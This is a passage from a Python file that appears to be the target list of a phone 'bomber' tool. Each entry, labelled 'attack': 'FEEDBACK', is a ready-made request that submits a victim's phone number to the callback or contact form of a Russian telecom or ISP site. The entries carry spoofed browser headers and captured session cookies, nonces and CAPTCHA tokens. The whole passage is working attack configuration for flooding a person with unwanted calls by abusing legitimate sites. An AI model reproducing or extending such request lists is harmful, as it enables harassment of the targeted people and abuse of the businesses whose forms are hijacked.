            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarySoERjTLjiDMCLmKE', 'Origin': 'https://e-interra.ru', 'Referer': 'https://e-interra.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'},
            'data': f'------WebKitFormBoundarySoERjTLjiDMCLmKE\r\nContent-Disposition: form-data; name="post_id"\r\n\r\n17\r\n------WebKitFormBoundarySoERjTLjiDMCLmKE\r\nContent-Disposition: form-data; name="form_id"\r\n\r\ne316f6a\r\n------WebKitFormBoundarySoERjTLjiDMCLmKE\r\nContent-Disposition: form-data; name="referer_title"\r\n\r\nГлавная - Интернет-провайдер Интерра\r\n------WebKitFormBoundarySoERjTLjiDMCLmKE\r\nContent-Disposition: form-data; name="queried_id"\r\n\r\n17\r\n------WebKitFormBoundarySoERjTLjiDMCLmKE\r\nContent-Disposition: form-data; name="form_fields[name]"\r\n\r\nINSIDE\r\n------WebKitFormBoundarySoERjTLjiDMCLmKE\r\nContent-Disposition: form-data; name="form_fields[email]"\r\n\r\n{email()}\r\n------WebKitFormBoundarySoERjTLjiDMCLmKE\r\nContent-Disposition: form-data; name="form_fields[field_5310a18]"\r\n\r\n+{number}\r\n------WebKitFormBoundarySoERjTLjiDMCLmKE\r\nContent-Disposition: form-data; name="form_fields[message]"\r\n\r\nINSIDE\r\n------WebKitFormBoundarySoERjTLjiDMCLmKE\r\nContent-Disposition: form-data; name="form_fields[field_8ca870d]"\r\n\r\non\r\n------WebKitFormBoundarySoERjTLjiDMCLmKE\r\nContent-Disposition: form-data; name="action"\r\n\r\nelementor_pro_forms_send_form\r\n------WebKitFormBoundarySoERjTLjiDMCLmKE\r\nContent-Disposition: form-data; name="referrer"\r\n\r\nhttps://e-interra.ru/#\r\n------WebKitFormBoundarySoERjTLjiDMCLmKE--\r\n'.encode(),
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Vist.Online', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://vist.online/connect',
            'cookies': {'_ym_uid': '1687862908621231952', '_ym_d': '1687862908', '_ym_visorc': 'w', 'carrotquest_session': 'fzhs5c240ibk6792077huq1ngewby6x1', '_ym_isad': '1', 'carrotquest_session_started': '1', 'carrotquest_device_guid': '84d6fd1e-412e-4127-86e5-e4b6a2b8b055', 'carrotquest_uid': '1474339255290433502', 'carrotquest_auth_token': 'user.1474339255290433502.25415-0a085dbe010fc0aebd33d2cfb7.9a4fce3bd25a4098dd8df872e1a964ddb5b015fdbd06ad8a', 'carrotquest_realtime_services_transport': 'wss', 'carrotquest_jwt_access': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdHQiOiJhY2Nlc3MiLCJleHAiOjE2ODc4NjY1MzUsImlhdCI6MTY4Nzg2MjkzNSwianRpIjoiMDQ1MTkzM2QzOTY4NDhkNWJjMzc5MTczZDBhOWNhZjQiLCJhY3QiOiJ3ZWJfdXNlciIsImN0cyI6MTY4Nzg2MjkzNSwicm9sZXMiOlsidXNlci4kYXBwX2lkOjI1NDE1LiR1c2VyX2lkOjE0NzQzMzkyNTUyOTA0MzM1MDIiXSwiYXBwX2lkIjoyNTQxNSwidXNlcl9pZCI6MTQ3NDMzOTI1NTI5MDQzMzUwMn0.weS1_sN0d9rS4foFfMDeGU154xGFYmunYiEXjQKj30w', '_vist_session': 'HoHIZHxhw5CLeo53D4BlDc9xXKCoI%2B9iKWnW4rLGh1MpTcZycovxaZnfUjcBs6GU661zmAY2jiKOZ6DMu17m0Ry39faWwprT2KOGt3yc1eDP7BmhF4gHHwRXmlWcE7FEPPnpeZZOELYDWiJJmiO5rAJ%2Fs7YgcN2EoGGdserEIA7CEXBSkbI8jiRvmSepgGsLQJqME9ySnyljspGC50Q%2FksgIc59%2ByLM497ZbzaQwrEu1RMb3Kt4DFn%2Fogom%2BOFhvloGnKmxpDFuEIcI3e8Sv4%2BkCONR7--F0UNo5cUg3Po8c7U--UywxkaMxv1WEiShIb9TXVg%3D%3D', 'carrotquest_closed_part_id': '1474339453051866365'},
            'headers': {'Accept': 'text/vnd.turbo-stream.html, text/html, application/xhtml+xml', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'Origin': 'https://vist.online', 'Referer': 'https://vist.online/connect', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'Turbo-Frame': 'connect', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'},
            'data': {'authenticity_token': '_vPZubR-H95dVsq_exkTo6P1kDw_sOmZV0OlrSYWamdo9yPC5NZhBl026A1kikQelVFEqKhAWr1FJw1NmGk-aQ', 'connect[address]': 'Волгоградская обл, г Волжский, тер. СНТ Лилия', 'connect[phone]': f'+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}', 'connect[name]': 'INSIDE', 'connect[agree]': ['0', '1'], 'commit': 'Подключить'},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Idealsauna.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://telephony.jivo.ru/api/1/sites/2124807/widgets/KmwPsXcpT5/clients/56/telephony/callback',
            'headers': {'authority': 'telephony.jivo.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://idealsauna.ru', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'user-agent': user_agent()[1],},
            'data': {'phone': number, 'invitation_text': '',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Focus.Life', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://focus.life/wp-admin/admin-ajax.php',
            'cookies': {'_ym_uid': '1687864394116295953', '_ym_d': '1687864394', '_ym_isad': '1', '_gid': 'GA1.2.380051671.1687864394', '_ym_visorc': 'w', '_ga_N336RN2BR1': 'GS1.1.1687864394.1.1.1687864406.0.0.0', '_ga': 'GA1.2.465128436.1687864394', '_ga_5LSGNZ49BC': 'GS1.2.1687864394.1.1.1687864406.0.0.0',},
            'headers': {'authority': 'focus.life', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://focus.life', 'referer': 'https://focus.life/zayavka-na-podklyuchenie/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'focusCBPhone=+7({str(number)[1:4]}){str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}&focusCBName=INSIDE&theme%5B%5D=%D0%9F%D0%BE%D0%B4%D0%BA%D0%BB%D1%8E%D1%87%D0%B5%D0%BD%D0%B8%D0%B5&action=callback_action&nonce=7f063eb499',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Focus.Life', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://focus.life/wp-admin/admin-ajax.php',
            'cookies': {'_ym_uid': '1687864394116295953', '_ym_d': '1687864394', '_ym_isad': '1', '_gid': 'GA1.2.380051671.1687864394', '_ym_visorc': 'w', '_ga_N336RN2BR1': 'GS1.1.1687864394.1.1.1687864406.0.0.0', '_ga': 'GA1.2.465128436.1687864394', '_ga_5LSGNZ49BC': 'GS1.2.1687864394.1.1.1687864406.0.0.0',},
            'headers': {'authority': 'focus.life', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryiyHBIwpVWjwt1Xwe', 'origin': 'https://focus.life', 'referer': 'https://focus.life/zayavka-na-podklyuchenie/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'data': f'------WebKitFormBoundaryiyHBIwpVWjwt1Xwe\r\nContent-Disposition: form-data; name="userLoc"\r\n\r\nКрона\r\n------WebKitFormBoundaryiyHBIwpVWjwt1Xwe\r\nContent-Disposition: form-data; name="userStrt"\r\n\r\nLolkin\r\n------WebKitFormBoundaryiyHBIwpVWjwt1Xwe\r\nContent-Disposition: form-data; name="userBld"\r\n\r\n5\r\n------WebKitFormBoundaryiyHBIwpVWjwt1Xwe\r\nContent-Disposition: form-data; name="userAprt"\r\n\r\n5\r\n------WebKitFormBoundaryiyHBIwpVWjwt1Xwe\r\nContent-Disposition: form-data; name="tarife-code"\r\n\r\n\r\n------WebKitFormBoundaryiyHBIwpVWjwt1Xwe\r\nContent-Disposition: form-data; name="userTrf"\r\n\r\nLife100\r\n------WebKitFormBoundaryiyHBIwpVWjwt1Xwe\r\nContent-Disposition: form-data; name="userTrfVillage"\r\n\r\nЛюкс_HD\r\n------WebKitFormBoundaryiyHBIwpVWjwt1Xwe\r\nContent-Disposition: form-data; name="userName"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryiyHBIwpVWjwt1Xwe\r\nContent-Disposition: form-data; name="userMail"\r\n\r\n\r\n------WebKitFormBoundaryiyHBIwpVWjwt1Xwe\r\nContent-Disposition: form-data; name="userPhone"\r\n\r\n+7({str(number)[1:4]}){str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}\r\n------WebKitFormBoundaryiyHBIwpVWjwt1Xwe\r\nContent-Disposition: form-data; name="userCmnt"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryiyHBIwpVWjwt1Xwe\r\nContent-Disposition: form-data; name="action"\r\n\r\ngo_focus_action\r\n------WebKitFormBoundaryiyHBIwpVWjwt1Xwe\r\nContent-Disposition: form-data; name="nonce"\r\n\r\n07e44c6d9f\r\n------WebKitFormBoundaryiyHBIwpVWjwt1Xwe--\r\n'.encode(),
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Letai.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://letai.ru/bitrix/services/main/ajax.php',
            'cookies': {'PHPSESSID': 'ZvfKMO40BpDZQ801LlrxHmGeaP64JfgD', '_ym_uid': '1687865319922751550', 'tmr_lvid': '6d71189d57cbdf8a3cdb290829b9df52', 'tmr_lvidTS': '1687865319877', '_ga_MS3HGYY2K7': 'GS1.1.1687865319.1.0.1687865319.0.0.0', '_ym_visorc': 'w', '_ym_isad': '1', 'BX_USER_ID': '82509a0e2649a00ee5eb912c4b016c1e', 'tmr_detect': '0%7C1687865328943', '_ga': 'GA1.2.210019025.1687865320', '_gid': 'GA1.2.1104334678.1687865338', '_gat_UA-215895296-1': '1', '_ym_d': '1687865363'},
            'headers': {'authority': 'letai.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9', 'bx-ajax': 'true', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://letai.ru', 'referer': 'https://letai.ru/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-bitrix-csrf-token': '5941541174693e31a182caa32d115119', 'x-bitrix-site-id': 's1'},
            'data': f'post[param_referer]=%D0%9B%D0%B5%D1%82%D0%B0%D0%B9%20(%D0%9F%D0%90%D0%9E%20%D0%A2%D0%B0%D1%82%D1%82%D0%B5%D0%BB%D0%B5%D0%BA%D0%BE%D0%BC)%20%E2%80%93%20%D0%BA%D1%80%D1%83%D0%BF%D0%BD%D0%B5%D0%B9%D1%88%D0%B8%D0%B9%20%D0%BE%D0%BF%D0%B5%D1%80%D0%B0%D1%82%D0%BE%D1%80%20%D0%BC%D0%BE%D0%B1%D0%B8%D0%BB%D1%8C%D0%BD%D0%BE%D0%B9%20%D1%81%D0%B2%D1%8F%D0%B7%D0%B8%20%D0%B2%20%D0%A2%D0%B0%D1%82%D0%B0%D1%80%D1%81%D1%82%D0%B0%D0%BD%D0%B5.&post[phone]=+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}&post[modal-callback-agree]=on',
            'params': {'mode': 'class', 'c': 'tattelecom:form', 'action': 'sendLead',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Transkom.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'http://transkom.ru/zakazat_-zvonok//',
            'cookies': {'PHPSESSID': 'e8dkhdoqbis5vagim81t0fbsq6', '_ym_uid': '1687865640291207907', '_ym_d': '1687865640', '_ga': 'GA1.2.1486717367.1687865641', '_gid': 'GA1.2.422830770.1687865641', '_gat': '1', '_ym_isad': '1',},
            'headers': {'Accept': 'text/html, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'http://transkom.ru', 'Referer': 'http://transkom.ru/', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest',},
            'data': {'ajax': 'true', 'fFeed7': 'INSIDE', 'fFeed8': number, 'fFeed9': 'INSIDE',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Siptell.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://siptell.ru/cf-api/CF5aa3e05bdafa1',
            'cookies': {'apbct_site_landing_ts': '1687865892', 'ct_sfw_pass_key': '45cd49b7e03b66397ca174d4a2c68a94', 'PHPSESSID': '8abc554a6125de878ad5b70ff5f214bc', 'ct_checkjs': '1624815093', 'ct_ps_timestamp': '1687865868', 'ct_timezone': '5', '_ym_uid': '1687865871779700859', '_ym_d': '1687865871', '_gid': 'GA1.2.171479539.1687865871', '_gat_gtag_UA_135779898_1': '1', '_ym_isad': '1', '_ga_H4DM5XV7PY': 'GS1.1.1687865870.1.0.1687865870.60.0.0', '_ga': 'GA1.1.1605109808.1687865871', '_fbp': 'fb.1.1687865871173.764669476', '_ym_visorc': 'w', 'abpct_hyro_acc_collect': '%7B%22orientation%22%3A%7B%22alpha%22%3A%7B%7D%2C%22beta%22%3A%7B%7D%2C%22gamma%22%3A%7B%7D%7D%2C%22motion%22%3A%7B%22x%22%3A%7B%221687865874323%22%3Anull%2C%221687865875323%22%3Anull%2C%221687865876325%22%3Anull%2C%221687865877326%22%3Anull%2C%221687865878331%22%3Anull%7D%2C%22y%22%3A%7B%221687865874323%22%3Anull%2C%221687865875323%22%3Anull%2C%221687865876325%22%3Anull%2C%221687865877326%22%3Anull%2C%221687865878331%22%3Anull%7D%2C%22z%22%3A%7B%221687865874323%22%3Anull%2C%221687865875323%22%3Anull%2C%221687865876325%22%3Anull%2C%221687865877326%22%3Anull%2C%221687865878331%22%3Anull%7D%7D%7D', 'ct_fkp_timestamp': '1687865878', 'ct_pointer_data': '%5B%5B0%2C599%2C8059%5D%2C%5B17%2C654%2C8104%5D%2C%5B59%2C792%2C8256%5D%2C%5B57%2C960%2C8416%5D%2C%5B41%2C1033%2C8653%5D%2C%5B41%2C1011%2C8712%5D%2C%5B45%2C971%2C9272%5D%2C%5B50%2C943%2C9308%5D%2C%5B56%2C908%2C9489%5D%2C%5B55%2C906%2C9683%5D%2C%5B54%2C914%2C9754%5D%2C%5B54%2C984%2C9906%5D%2C%5B54%2C1046%2C10059%5D%2C%5B54%2C1122%2C10211%5D%2C%5B52%2C1233%2C10362%5D%2C%5B50%2C1278%2C10514%5D%2C%5B57%2C1316%2C10662%5D%2C%5B58%2C1316%2C11359%5D%2C%5B64%2C1306%2C11408%5D%2C%5B185%2C1160%2C11568%5D%2C%5B227%2C1006%2C11722%5D%2C%5B264%2C903%2C11859%5D%2C%5B284%2C895%2C12006%5D%2C%5B301%2C927%2C12159%5D%2C%5B307%2C936%2C12367%5D%2C%5B302%2C939%2C14110%5D%2C%5B1%2C462%2C16317%5D%2C%5B94%2C652%2C16373%5D%2C%5B187%2C757%2C16511%5D%2C%5B234%2C821%2C16671%5D%2C%5B281%2C894%2C16823%5D%2C%5B300%2C961%2C16962%5D%2C%5B313%2C969%2C17305%5D%2C%5B383%2C969%2C17420%5D%2C%5B454%2C960%2C17566%5D%2C%5B472%2C940%2C18053%5D%2C%5B421%2C908%2C18163%5D%2C%5B401%2C903%2C18315%5D%2C%5B400%2C902%2C18901%5D%2C%5B401%2C900%2C18914%5D%2C%5B411%2C877%2C19343%5D%2C%5B411%2C872%2C24142%5D%2C%5B440%2C816%2C24163%5D%2C%5B483%2C765%2C24468%5D%2C%5B475%2C800%2C25114%5D%2C%5B475%2C807%2C25309%5D%2C%5B481%2C834%2C25363%5D%2C%5B482%2C847%2C27640%5D%5D', 'apbct_timestamp': '1687865924', 'apbct_page_hits': '2', 'apbct_cookies_test': '%257B%2522cookies_names%2522%253A%255B%2522apbct_timestamp%2522%252C%2522apbct_site_landing_ts%2522%252C%2522apbct_page_hits%2522%255D%252C%2522check_value%2522%253A%2522874b93718e22075d12b06148bd3c2ff2%2522%257D', 'apbct_visible_fields': 'fld_9340668%20fld_8823504%20fld_5268957', 'apbct_visible_fields_count': '3'},
            'headers': {'authority': 'siptell.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryB3y3rPtuBBUDRoES', 'origin': 'https://siptell.ru', 'referer': 'https://siptell.ru/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest'},
            'data': f'------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="_cf_verify"\r\n\r\n0c23fc281b\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="_wp_http_referer"\r\n\r\n/\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="_cf_frm_id"\r\n\r\nCF5aa3e05bdafa1\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="_cf_frm_ct"\r\n\r\n2\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="cfajax"\r\n\r\nCF5aa3e05bdafa1\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="_cf_cr_pst"\r\n\r\n4\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="order_number"\r\n\r\n\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="fld_9340668"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="fld_8823504"\r\n\r\n{number}\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="fld_5268957"\r\n\r\n{email()}\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="fld_8331876"\r\n\r\nclick\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="instance"\r\n\r\n2\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="formId"\r\n\r\nCF5aa3e05bdafa1\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="request"\r\n\r\nhttps://siptell.ru/cf-api/CF5aa3e05bdafa1\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="postDisable"\r\n\r\n0\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="target"\r\n\r\n#caldera_notices_2\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="loadClass"\r\n\r\ncf_processing\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="loadElement"\r\n\r\n_parent\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="hiderows"\r\n\r\ntrue\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="customCallback"\r\n\r\nchangeModal();\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="action"\r\n\r\ncf_process_ajax_submit\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="cfajax"\r\n\r\nCF5aa3e05bdafa1\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES\r\nContent-Disposition: form-data; name="template"\r\n\r\n#cfajax_CF5aa3e05bdafa1-tmpl\r\n------WebKitFormBoundaryB3y3rPtuBBUDRoES--\r\n',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'www.юг-телеком.com', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.xn----etbhazejp5a1j.com/wp-admin/admin-ajax.php',
            'headers': {'authority': 'www.xn----etbhazejp5a1j.com', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded;charset=UTF-8', 'origin': 'https://www.xn----etbhazejp5a1j.com', 'referer': 'https://www.xn----etbhazejp5a1j.com/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'data': {'action': 'handler', 'name': 'INSIDE', 'address': 'INSIDE', 'phone': f'+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}', 'rates': 'Юг 30, Скорость: 30 Мбит/сек', 'rate': '160', 'token': '03AL8dmw-aHaRlBO-vkiQPj7WqNZiZinzgTN3Jj4g-6ii9JwXVSRBCUyf6n9oaXygD3bN2csbRXMcyS0Vx_iUsdPjVBq2LguGmTboO0p2jtH6_DrNFtgv17NK_Z1OEaKG2B70RbSayTjWX9CskrpJCgV3hcyErY2D_iL8yRa3B_LjYQm0VqrnOWWei_1S-jP9hRWOWS9chpT2vTCq3V8GQYkpZz3DBXpfHmAAeXmxNx2t_dgU5rcE8oCyxywAMgqg0qjenrg0uDQEUQXTO8h0spzzZxeu4LBWK2AldZfCeqKpP0SBNB0QQXPjZQ4-dXmQ-q56Qeb_nu9o96drIa5V46S7-ZQtRwnjp3KzhcbF8Ly9mAPyAYZ4upww1MgmUFX9I-5uBcsExvkeC-LqEdOC3n4OP3mKo7SZEMQvD5AroN9AGygG7j5Yl__AekbM0UA9OhWqwMwErHHG85fAMbM9DaMCo3eA7DykYBWPmQ_49sViXfbwNf4Ko1Fd6vp8_AiGjzmN7ZU4RNBjVmqF7HklDRenbrCksKpPI_-8xBJZt3V3MMcEMAec-sDs'},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Ugtelecom.info', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://ugtelecom.info/wp-json/contact-form-7/v1/contact-forms/1227/feedback',
            'headers': {'authority': 'ugtelecom.info', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryFCCB9YRc4s4NbBKz', 'origin': 'https://ugtelecom.info', 'referer': 'https://ugtelecom.info/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest'},
            'data': f'------WebKitFormBoundaryFCCB9YRc4s4NbBKz\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n1227\r\n------WebKitFormBoundaryFCCB9YRc4s4NbBKz\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.3.2\r\n------WebKitFormBoundaryFCCB9YRc4s4NbBKz\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nru_RU\r\n------WebKitFormBoundaryFCCB9YRc4s4NbBKz\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f1227-o3\r\n------WebKitFormBoundaryFCCB9YRc4s4NbBKz\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n0\r\n------WebKitFormBoundaryFCCB9YRc4s4NbBKz\r\nContent-Disposition: form-data; name="_wpcf7_posted_data_hash"\r\n\r\n\r\n------WebKitFormBoundaryFCCB9YRc4s4NbBKz\r\nContent-Disposition: form-data; name="_wpcf7_recaptcha_response"\r\n\r\n03AL8dmw8DidiFBUT_XA_f7MQcOeSjAoj9MYnKxBqz-0ARRJOu9-R2va3jXRJOwjq-nVCMJf2dbY6CAUeGQJB9y6lk_9B26fsW8P0jBwJVj8F7ahqrPIwY-3Q4KaOtQloLIO15BroiNcZ5iOk1FzDW58nMc6Osq7L5asz5OBUQkryHR9E5PbnfqtvJxy_kfoTJtYYWUzUbshadn6mTrh0yMurPWm3Onc7e-HqUaMbxrKpi__5WUhvxaF3KWmXOrcaIqax5gV09lwp8QOcDSB4fYnP86Xd-BWmrxa-NLz0ZadEoF7vOygQJBpNdPNyM42Aq75tm3EF0uaxgSeOISv5dN0AiNBr1AgjroyMRx6bHAuil39xJiCXe1opzxUIQhPrjt0_iIhNp3WKX82EyKDTDcrsSgLLS8F9wPYXjg7rGHwpku9b0nE7dp7VcHespz4nAJhjysk89fY6HuZ4P3-6kapKfgnwquPIw_ddjcFyTZiBAj-uTQqTR8MVFbOdOKEZERgqcLW_ySrDBNXBZCoQo35RExephGxiLThsA5R7Wbs9YKwKATMtDzNk\r\n------WebKitFormBoundaryFCCB9YRc4s4NbBKz\r\nContent-Disposition: form-data; name="contact-name"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryFCCB9YRc4s4NbBKz\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{number}\r\n------WebKitFormBoundaryFCCB9YRc4s4NbBKz--\r\n',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'TelPlus.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://telplus.ru/kvartira/aktsii/',
            'cookies': {'PHPSESSID': 'z64BOQDt78d0LyZHhDGmfwAb92hXfsv4', '_ym_uid': '1687866601635353998', '_ym_d': '1687866601', '_ym_isad': '1', 'BX_USER_ID': '5031dd606d07c31d733c7b287ce1c0b7', '_ym_visorc': 'w', 'JivoSiteLoaded': '1'},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://telplus.ru', 'Referer': 'https://telplus.ru/kvartira/aktsii/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'},
            'data': f'action=promotion_trf&trf_name=2+%D0%B2+1+-+450+%D1%80%D1%83%D0%B1%2F%D0%BC%D0%B5%D1%81&user_name=INSIDE&user_phone=+7({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}&politic=on',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Ellco.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.ellco.ru/v1/orders',
